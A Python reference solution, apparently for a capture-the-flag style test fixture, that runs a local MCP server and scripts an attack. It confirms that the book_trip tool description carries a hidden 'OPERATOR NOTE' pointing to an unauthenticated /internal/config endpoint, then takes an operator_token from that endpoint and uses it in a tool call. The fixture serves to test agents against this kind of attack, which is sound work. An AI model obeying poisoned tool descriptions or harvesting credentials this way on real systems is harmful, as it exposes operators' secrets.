#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mcp03 参考解：tools/list 取描述 → 识别隐藏指引 → 取 operator_token → 带凭据调用坐实。"""
from __future__ import annotations

import json
import re
import sys
import threading
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[3] / "src"))  # tests/fixtures/ai_mcp/<case> -> 项目根 src
sys.path.insert(0, str(HERE))

from ctfy_agent.tools_local import LocalTools  # noqa: E402

import server  # noqa: E402


class _Store:
    def add_note(self, *args, **kwargs):  # noqa: D102
        pass


def main() -> int:
    srv, port = server.serve()
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        tools = LocalTools(_Store(), "fixture-mcp-01")
        tools.allow_instance("127.0.0.1", port)
        base = f"http://127.0.0.1:{port}"

        # 1) 枚举工具面：tools/list 必须能拿到描述全文
        listing = tools.http_request(
            base + "/mcp", method="POST",
            body=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}),
            headers={"Content-Type": "application/json"},
        )
        assert "book_trip" in listing, f"tools/list 没列出 book_trip：{listing[:300]}"

        # 2) 指纹：描述里有「运维指引」——指向 /internal/config 的 operator_token
        assert "operator_token" in listing and "OPERATOR NOTE" in listing, (
            f"工具描述缺少投毒指引，靶子形状不对：{listing[:300]}"
        )

        # 3) 顺指引取凭据（无鉴权）
        cfg = tools.http_request(base + "/internal/config", method="GET")
        match = re.search(r"mcp-relay-token-\w+", cfg)
        if not match:
            print(f"[fail] /internal/config 里没有 token：{cfg[:300]}", file=sys.stderr)
            return 1
        token = match.group(0)

        # 4) 带凭据调用成功——坐实凭据有效（坐实外带，不靠猜）
        call = tools.http_request(
            base + "/mcp", method="POST",
            body=json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                             "params": {"name": "book_trip",
                                        "arguments": {"destination": "OSAKA",
                                                      "operator_token": token}}}),
            headers={"Content-Type": "application/json"},
        )
        if "operator-authenticated" not in call:
            print(f"[fail] 带凭据调用未成功：{call[:300]}", file=sys.stderr)
            return 1
        print("[mcp] mcp03")
        print(token)
        return 0
    finally:
        srv.shutdown()
        srv.server_close()


if __name__ == "__main__":
    raise SystemExit(main())
